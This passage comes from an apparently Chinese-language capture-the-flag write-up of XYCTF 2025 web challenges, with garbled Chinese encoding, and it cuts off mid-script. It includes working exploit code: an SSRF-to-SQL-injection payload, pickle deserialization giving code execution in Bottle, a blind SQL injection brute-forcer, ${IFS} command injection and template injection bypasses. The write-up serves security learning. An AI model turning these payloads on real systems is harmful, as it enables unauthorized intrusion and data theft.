class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-built_in">print</span>(flask.request.remote_addr)<br>    <span class="hljs-keyword">return</span> flask.render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/1337&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">api_search</span>():<br>    <span class="hljs-keyword">if</span> flask.request.remote_addr == <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>:<br>        code = flask.request.args.get(<span class="hljs-string">&#x27;0&#x27;</span>)<br>        <span class="hljs-keyword">if</span> code == <span class="hljs-string">&#x27;abcdefghi&#x27;</span>:<br>            req = flask.request.args.get(<span class="hljs-string">&#x27;1&#x27;</span>)<br>            <span class="hljs-keyword">try</span>:<br>                req = binary_to_string(req)<br>                <span class="hljs-built_in">print</span>(req)<br>                req = json.loads(req) <span class="hljs-comment"># No one can hack it, right? Pickle unserialize is not secure, but json is ;)</span><br>            <span class="hljs-keyword">except</span>:<br>                flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Invalid JSON&quot;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;name&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> req:<br>                flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Empty Person&#x27;s name&quot;</span>)<br><br>            name = req[<span class="hljs-string">&#x27;name&#x27;</span>]<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(name) &gt; <span class="hljs-number">6</span>:<br>                flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Too long&quot;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;\&#x27;&#x27;</span> <span class="hljs-keyword">in</span> name:<br>                flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;NO &#x27;&quot;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;)&#x27;</span> <span class="hljs-keyword">in</span> name:<br>                flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;NO )&quot;</span>)<br>            <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">            Some waf hidden here ;)</span><br><span class="hljs-string">            &quot;&quot;&quot;</span><br><br>            fate = db_search(name)<br>            <span class="hljs-keyword">if</span> fate <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                flask.abort(<span class="hljs-number">404</span>, <span class="hljs-string">&quot;No such Person&quot;</span>)<br><br>            <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&#x27;Fate&#x27;</span>: fate&#125;<br>        <span class="hljs-keyword">else</span>:<br>            flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Hello local, and hello hacker&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        flask.abort(<span class="hljs-number">403</span>, <span class="hljs-string">&quot;Only local access allowed&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p><strong>å…³é”®è·¯ç”±</strong></p><p>1ã€&#x2F;proxyï¼šè·å–ç”¨æˆ·è¯·æ±‚ä¸­çš„urlå‚æ•°ï¼Œå°†å…¶æ‹¼æ¥åˆ°<a href="http://lamentxu.top/">http://lamentxu.top</a> åé¢ï¼Œæ£€æŸ¥åé€šè¿‡requests.getå‘å‡ºè¯·æ±‚ï¼Œå¹¶è¿”å›å“åº”å†…å®¹ï¼ˆæ‰“ssrfï¼‰</p><p>2ã€&#x2F;1337ï¼šæ¥å—æœ¬åœ°è¯·æ±‚ï¼Œç®€å•æ£€æŸ¥åæ‰§è¡Œæ•°æ®åº“æŸ¥è¯¢æ“ä½œï¼ˆæ‰“sqlæ³¨å…¥ï¼‰</p><p><strong>å…ˆæ˜¯ssrf</strong></p><p>æºç åœ¨ç›®æ ‡urlå‰åŠ äº†ä¸€ä¸ªåŸŸålamentxu.topï¼ŒåŠ ä¸€ä¸ª@è·³åˆ°è‡ªå®šä¹‰çš„url</p><p>ç¦ç”¨äº†æ‰€æœ‰å­—æ¯å’Œâ€œ.â€ï¼Œå¯ä»¥ç”¨åè¿›åˆ¶è¡¨ç¤ºIPV4åœ°å€ï¼ˆç‚¹åˆ†åè¿›åˆ¶ï¼š127.0.0.1ï¼ŒäºŒè¿›åˆ¶ï¼š0111 1111 0000 0000 0000 0000 0000 0001ï¼Œåè¿›åˆ¶ï¼š2130706433ï¼‰ï¼Œæˆ–è€…ç”¨0ç»•è¿‡ï¼ˆlinuxä¸­è®¿é—®0ä¼šè§£æä¸º127.0.0.1ï¼‰</p><blockquote><p>&#x2F;proxy?url&#x3D;@0:8080&#x2F;1337</p></blockquote><p><strong>ç„¶åç»•è¿‡&#x2F;1337è·¯ç”±ä¸‹çš„æ£€æŸ¥</strong></p><p>é¦–å…ˆä¼ å…¥çš„å‚æ•°0éœ€è¦ç­‰äºâ€œabcdefghiâ€ï¼Œä½†æ˜¯ä»£ç†ç½‘é¡µç¦ç”¨äº†æ‰€æœ‰å­—æ¯ï¼Œå¯ä»¥ç”¨äºŒæ¬¡urlç¼–ç ç»•è¿‡</p><blockquote><p>&#x2F;proxy?url&#x3D;@0:8080&#x2F;1337?0&#x3D;%25%36%31%25%36%32%25%36%33%25%36%34%25%36%35%25%36%36%25%36%37%25%36%38%25%36%39</p></blockquote><p>ç„¶åå»æ„é€ å‚æ•°1ï¼Œå‚æ•°1ä¼šç»è¿‡ä¸€ä¸ªbinary_to_string()å‡½æ•°ï¼Œå°†äºŒè¿›åˆ¶è½¬ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¿™é‡ŒæŒ‰ç…§binary_to_string()å»å†™ä¸€ä¸ªstirng_to_binary()å‡½æ•°å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">string_to_binary</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;å°†å¯è¯»æ–‡æœ¬è½¬æ¢ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²&#x27;&#x27;&#x27;</span><br>    binary_list = [<span class="hljs-built_in">format</span>(<span class="hljs-built_in">ord</span>(c), <span class="hljs-string">&#x27;08b&#x27;</span>) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> text]<br>    binary_string = <span class="hljs-string">&#x27;&#x27;</span>.join(binary_list)<br>    <span class="hljs-keyword">return</span> binary_string<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥è¿›è¡Œé•¿åº¦ç»•è¿‡ï¼Œ<strong>len()å‡½æ•°å¯¹å­—ç¬¦ä¸²ä¼šç»Ÿè®¡å…¶å­—ç¬¦çš„ä¸ªæ•°ï¼Œè€Œå¯¹å…ƒç»„ã€åˆ—è¡¨å’Œå­—å…¸åªä¼šç»Ÿè®¡å…¶å…ƒç´ çš„ä¸ªæ•°</strong>ï¼Œè¿™é‡Œé™åˆ¶äº†å…ƒç»„å’Œåˆ—è¡¨ï¼Œä½¿ç”¨å­—å…¸ç»•è¿‡</p><p><strong>æœ€åæ‰“sqlæ³¨å…¥</strong></p><p>init_db.pyä¸­æœ‰æç¤ºï¼Œå¯ä»¥ç›´æ¥æŸ¥Â·Â·Â·WHERE NAME &#x3D; â€˜LAMENTXUâ€™</p><p>å…ˆç”¨)))))))å»é—­åˆå‰é¢çš„upper()å‡½æ•°ï¼Œå†unionè¿›è¡Œè”åˆæ³¨å…¥</p><p>æ„é€ çš„json</p><blockquote><p>original_text &#x3D; â€˜â€™â€™{â€œnameâ€: {â€œâ€˜))))))) UNION SELECT FATE FROM FATETABLE WHERE NAME&#x3D;â€™LAMENTXUâ€™ â€“â€: 1}}â€™â€™â€™</p></blockquote><p>åˆ©ç”¨string_to_binary()è½¬æˆäºŒè¿›åˆ¶ï¼Œæœ€ç»ˆpayload</p><blockquote><p>&#x2F;proxy?url&#x3D;@0:8080&#x2F;1337?0&#x3D;%25%36%31%25%36%32%25%36%33%25%36%34%25%36%35%25%36%36%25%36%37%25%36%38%25%36%39%261&#x3D;0111101100100010011011100110000101101101011001010010001000111010001000000111101100100010001001110010100100101001001010010010100100101001001010010010100100100000010101010100111001001001010011110100111000100000010100110100010101001100010001010100001101010100001000000100011001000001010101000100010100100000010001100101001001001111010011010010000001000110010000010101010001000101010101000100000101000010010011000100010100100000010101110100100001000101010100100100010100100000010011100100000101001101010001010011110100100111010011000100000101001101010001010100111001010100010110000101010100100111001000000010110100101101001000100011101000100000001100010111110101111101</p></blockquote><p>bpæ‰“</p><p><img src="/../images/xyctf2025-web%E5%A4%8D%E7%8E%B0/fate.png"></p><h2 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h2><p>æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">@File    :   main.py</span><br><span class="hljs-string">@Time    :   2025/03/28 22:20:49</span><br><span class="hljs-string">@Author  :   LamentXU </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">flag in /flag_&#123;uuid4&#125;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">from</span> bottle <span class="hljs-keyword">import</span> Bottle, request, response, redirect, static_file, run, route<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;../../secret.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    secret = f.read()<br><br>app = Bottle()<br><span class="hljs-meta">@route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;HI&#x27;&#x27;&#x27;</span><br><span class="hljs-meta">@route(<span class="hljs-params"><span class="hljs-string">&#x27;/download&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>():<br>    name = request.query.filename<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;../../&#x27;</span> <span class="hljs-keyword">in</span> name <span class="hljs-keyword">or</span> name.startswith(<span class="hljs-string">&#x27;/&#x27;</span>) <span class="hljs-keyword">or</span> name.startswith(<span class="hljs-string">&#x27;../&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;\\&#x27;</span> <span class="hljs-keyword">in</span> name:<br>        response.status = <span class="hljs-number">403</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Forbidden&#x27;</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(name, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        data = f.read()<br>    <span class="hljs-keyword">return</span> data<br><br><span class="hljs-meta">@route(<span class="hljs-params"><span class="hljs-string">&#x27;/secret&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">secret_page</span>():<br>    <span class="hljs-keyword">try</span>:<br>        session = request.get_cookie(<span class="hljs-string">&quot;name&quot;</span>, secret=secret)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session <span class="hljs-keyword">or</span> session[<span class="hljs-string">&quot;name&quot;</span>] == <span class="hljs-string">&quot;guest&quot;</span>:<br>            session = &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;guest&quot;</span>&#125;<br>            response.set_cookie(<span class="hljs-string">&quot;name&quot;</span>, session, secret=secret)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Forbidden!&#x27;</span><br>        <span class="hljs-keyword">if</span> session[<span class="hljs-string">&quot;name&quot;</span>] == <span class="hljs-string">&quot;admin&quot;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;The secret has been deleted!&#x27;</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Error!&quot;</span><br>run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8080</span>, debug=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><p><strong>å…³é”®è·¯ç”±</strong></p><p>1ã€&#x2F;downloadï¼šå¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶ï¼Œä½†é™åˆ¶äº†ç›®å½•ç©¿è¶Š</p><p>2ã€&#x2F;secretï¼šè¿›è¡Œç”¨æˆ·éªŒè¯ï¼ˆè°ƒç”¨äº†get_cookie()ï¼Œget_cookie()ä¸­æœ‰ä¸€æ®µä»£ç æ˜¯å°†base64è§£ç åè¿›è¡Œååºåˆ—åŒ–ï¼Œæ‹¿åˆ°secretå³å¯è¿›è¡Œååºåˆ—åŒ–ï¼‰</p><p><img src="/../images/xyctf2025-web%E5%A4%8D%E7%8E%B0/Signin1.png"></p><p><strong>å…ˆæ‹¿secret</strong></p><p>é€šè¿‡.&#x2F;..&#x2F;.&#x2F;..&#x2F;secret.txtï¼Œç»•è¿‡é™åˆ¶è¿›è¡Œç›®å½•ç©¿è¶Šæ‹¿secret</p><blockquote><p>payloadï¼šdownload&#x2F;filename&#x3D;.&#x2F;..&#x2F;.&#x2F;..&#x2F;secret.txt</p><p>secretï¼šHell0_H@cker_Y0u_A3r_Sm@r7</p></blockquote><p><strong>æ‰“pickleååºåˆ—åŒ–</strong></p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> bottle <span class="hljs-keyword">import</span> cookie_encode<br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://gz.imxbt.cn:20154/secret&quot;</span><br>secret = <span class="hljs-string">&quot;Hell0_H@cker_Y0u_A3r_Sm@r7&quot;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;cp /f* ./flag.txt&#x27;)&quot;</span>,))<br><br>name = cookie_encode(<br>    (<span class="hljs-string">&#x27;session&#x27;</span>, &#123;<span class="hljs-string">&quot;name&quot;</span>: [Test()]&#125;),<br>    secret<br>)<br><br><span class="hljs-comment">#print(name.decode())</span><br><br>requests.get(url, cookies=&#123;<span class="hljs-string">&#x27;name&#x27;</span>: name.decode()&#125;)<br></code></pre></td></tr></table></figure><p><img src="/../images/xyctf2025-web%E5%A4%8D%E7%8E%B0/Signin2.png"></p><h2 id="ez-puzzle"><a href="#ez-puzzle" class="headerlink" title="ez_puzzle"></a>ez_puzzle</h2><p>ç¦ç”¨äº†é¼ æ ‡å’Œé”®ç›˜ï¼Œæ›´å¤šå·¥å…·ä¸­æ‰“å¼€å¼€å‘è€…å·¥å…·ï¼Œå‘ç°æœ‰åè°ƒè¯•ï¼Œå³é”®é€‰æ‹©â€œå‘å¿½ç•¥åˆ—è¡¨æ·»åŠ è„šæœ¬â€ï¼Œè™½ç„¶æ— æ³•è°ƒè¯•ä½†å¹¶æ²¡æœ‰ä»€ä¹ˆå½±å“</p><p>é¢˜ç›®è¯´è¦æ˜¯èƒ½åœ¨2ç§’å†…è§£å†³è¿™ä¸ªpuzzlï¼Œå°±ç»™flagï¼Œä¸æ—¶é—´æœ‰å…³ï¼Œåœ¨æºç ä¸­æ£€ç´¢å…³é”®è¯timeï¼Œå‘ç°startTimeå’ŒendTimeï¼Œä¼°è®¡flagçš„å¼¹çª—æ¡ä»¶ä¸ºendTime-startTime &lt; 2ï¼Œé€šè¿‡æ§åˆ¶å°èµ‹ä¸€ä¸ªè¾ƒå¤§å€¼ç»™startTimeï¼Œå¦‚startTime &#x3D; 10000000000</p><p>ç„¶åå®Œæˆæ‹¼å›¾å³å¯</p><p><img src="/../images/xyctf2025-web%E5%A4%8D%E7%8E%B0/puzzl1.png"></p><h2 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h2><p>æç¤ºæœ‰sqlæ³¨å…¥ï¼Œé€šè¿‡å°è¯•ç¡®å®šusernameä¸ºæ³¨å…¥ç‚¹</p><p>å°è¯•ç”¨ä¸‡èƒ½å¯†ç â€™or(1&#x3D;1)#</p><p><img src="/../images/xyctf2025-web%E5%A4%8D%E7%8E%B0/ezsql1.png"></p><p>è¿˜æœ‰ä¸€å±‚éœ€è¦è¾“å…¥å¯†é’¥ï¼Œåˆ©ç”¨å¸ƒå°”ç›²æ³¨</p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://gz.imxbt.cn:20185/login.php&quot;</span><br>secret = <span class="hljs-string">&quot;&quot;</span><br>char_set = <span class="hljs-string">&quot;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890_&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> char_set:<br>        <br>        <span class="hljs-comment">#çˆ†åº“å</span><br>        <span class="hljs-comment">#payload =  f&quot;&#x27;or\tsubstr(database()from(&#123;i&#125;)for(1))=&#x27;&#123;j&#125;&#x27;#&quot;</span><br><br>        <span class="hljs-comment">#çˆ†è¡¨å</span><br>        <span class="hljs-comment">#payload = f&quot;&#x27;or\tsubstr((select\tgroup_concat(table_name)from\tinformation_schema.tables\twhere\ttable_schema=&#x27;testdb&#x27;)from(&#123;i&#125;)for(1))=&#x27;&#123;j&#125;&#x27;#)&quot;</span><br><br>        <span class="hljs-comment">#çˆ†åˆ—å</span><br>        <span class="hljs-comment">#payload = f&quot;&#x27;or\tsubstr((select\tgroup_concat(column_name)from\tinformation_schema.columns\twhere\ttable_name=&#x27;double_check&#x27;)from(&#123;i&#125;)for(1))=&#x27;&#123;j&#125;&#x27;#&quot;</span><br><br>        <span class="hljs-comment">#çˆ†å­—æ®µ</span><br>        payload = <span class="hljs-string">f&quot;&#x27;or\tsubstr((select\tgroup_concat(secret)from\tdouble_check)from(<span class="hljs-subst">&#123;i&#125;</span>)for(1))=&#x27;<span class="hljs-subst">&#123;j&#125;</span>&#x27;#&quot;</span><br><br>        data = &#123;<span class="hljs-string">&quot;username&quot;</span>: payload, <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-number">123</span>&#125;<br><br>        res = requests.post(url=url, data=data)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ç›®å‰ç”±äºç³»ç»Ÿæ¶æ„ç™»å½•å°è¯•è¯·æ±‚è¿‡å¤š,ç°å·²å¼€å¯åŒé‡è®¤è¯æœºåˆ¶,è¯·è¾“å…¥ç®¡ç†å‘˜è´¦æˆ·çš„ç§˜é’¥&quot;</span> <span class="hljs-keyword">in</span> res.text:<br>            secret += j<br>            <span class="hljs-built_in">print</span>(secret)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><blockquote><p>secretï¼šdtfrtkcc0czkoua9s</p></blockquote><p>å‘½ä»¤æ‰§è¡Œæ— å›æ˜¾å¹¶å°†ç©ºæ ¼ç¦ç”¨ï¼Œåˆ©ç”¨${IFS}ç»•è¿‡å’Œ&gt;é‡å®šå‘</p><blockquote><p>cat${IFS}&#x2F;f*${IFS}&gt;flag.txt</p></blockquote><p>å†è®¿é—®&#x2F;flag.txtå³å¯</p><h2 id="å‡ºé¢˜äººå·²ç–¯"><a href="#å‡ºé¢˜äººå·²ç–¯" class="headerlink" title="å‡ºé¢˜äººå·²ç–¯"></a>å‡ºé¢˜äººå·²ç–¯</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">@File    :   app.py</span><br><span class="hljs-string">@Time    :   2025/03/29 15:52:17</span><br><span class="hljs-string">@Author  :   LamentXU </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">import</span> bottle<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">flag in /flag</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-meta">@bottle.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello, World!&#x27;</span><br><span class="hljs-meta">@bottle.route(<span class="hljs-params"><span class="hljs-string">&#x27;/attack&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>():<br>    payload = bottle.request.query.get(<span class="hljs-string">&#x27;payload&#x27;</span>)<br>    <span class="hljs-keyword">if</span> payload <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(payload) &lt; <span class="hljs-number">25</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;open&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> payload <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;\\&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> payload:<br>        <span class="hljs-keyword">return</span> bottle.template(<span class="hljs-string">&#x27;hello &#x27;</span>+payload)<br>    <span class="hljs-keyword">else</span>:<br>        bottle.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&#x27;Invalid payload&#x27;</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    bottle.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>æ˜æ˜¾çš„bottleæ¨¡æ¿æ³¨å…¥ï¼Œä½†é™åˆ¶äº†é•¿åº¦å¹¶ç¦ç”¨äº†openå’Œ\</p><p>å¯ä»¥ç”¨latin-1ç»•è¿‡å¯¹opençš„ç¦ç”¨ï¼ˆä½†ä¼¼ä¹åªæœ‰å°‘æ•°å­—ç¬¦åœ¨åœ¨éƒ¨åˆ†æƒ…å†µä¸‹æ‰ä¼šè¢«æ­£ç¡®è§£æä¸ºå¯¹åº”çš„asciiç ï¼Œå‚è€ƒåšå®¢ï¼š<a href="https://www.cnblogs.com/LAMENTXU/articles/18805019%EF%BC%89">https://www.cnblogs.com/LAMENTXU/articles/18805019ï¼‰</a></p><blockquote><p>Latin-1ç¼–ç ï¼Œä¹Ÿç§°ä¸ºISO-8859-1ï¼Œæ˜¯ä¸€ç§å•å­—èŠ‚å­—ç¬¦é›†ï¼Œå®ƒæ‰©å±•äº†ASCIIç¼–ç ä»¥åŒ…æ‹¬è¥¿æ¬§è¯­è¨€çš„å­—ç¬¦ã€‚Latin-1ç¼–ç çš„èŒƒå›´æ˜¯0x00-0xFFï¼Œå…¶ä¸­0x00-0x7Fä¹‹é—´çš„ç¼–ç ä¸ASCIIå®Œå…¨ä¸€è‡´ï¼Œè€Œ0x80-0xFFä¹‹é—´åˆ™åŒ…å«äº†æ§åˆ¶å­—ç¬¦å’Œæ–‡å­—ç¬¦å·ã€‚è¿™ç§ç¼–ç æ–¹å¼åœ¨æ”¯æŒLatin-1çš„ç³»ç»Ÿä¸­ä¼ è¾“å’Œå­˜å‚¨å…¶ä»–ä»»ä½•ç¼–ç çš„å­—èŠ‚æµæ—¶ï¼Œä¸ä¼šä¸¢å¤±ä¿¡æ¯ï¼Œè¿™ä½¿å¾—å®ƒåœ¨æŸäº›æ•°æ®åº“ç³»ç»Ÿä¸­ï¼Œå¦‚MySQLä¸­è¢«é»˜è®¤ä½¿ç”¨ã€‚åœ¨å¤„ç†Latin-1ç¼–ç æ—¶ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå°½ç®¡å®ƒå…¼å®¹ASCIIç¼–ç ï¼Œä½†å®ƒå¹¶ä¸æ”¯æŒæ‰€æœ‰è¯­è¨€çš„å­—ç¬¦ã€‚</p></blockquote><p>å°†oæ›¿æ¢æˆ%baå³å¯</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">payloadï¼š/attack?payload=</span><span class="hljs-template-variable">&#123;&#123;%<span class="hljs-name">bapen</span>(<span class="hljs-name">&#x27;/flag&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/../images/xyctf2025-web%E5%A4%8D%E7%8E%B0/crazy1.png"></p><p>ä¹Ÿå¯ä»¥ç”¨bottleçš„æ¨¡æ¿è¯­æ³•ï¼Œå°†payloadå­—ç¬¦é€ä¸ªæ³¨å…¥ï¼Œç»•è¿‡é•¿åº¦é™åˆ¶ï¼Œç„¶åæ‰§è¡Œ</p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://gz.imxbt.cn:20187/attack&quot;</span><br>payload = <span class="hljs-string">f&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /f* &gt; hah&#x27;)&quot;</span><br><br>flag = <span class="hljs-literal">True</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload:<br>    <span class="hljs-keyword">if</span> flag:<br>        tmp = <span class="hljs-string">f&#x27;\n%import os;os.a=&quot;<span class="hljs-subst">&#123;i&#125;</span>&quot;&#x27;</span><br>        flag = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        tmp = <span class="hljs-string">f&#x27;\n%import os;os.a+=&quot;<span class="hljs-subst">&#123;i&#125;</span>&quot;&#x27;</span><br>    r = requests.get(url, params=&#123;<span class="hljs-string">&quot;payload&quot;</span>: tmp&#125;)<br><br>r = requests.get(url, params=&#123;<span 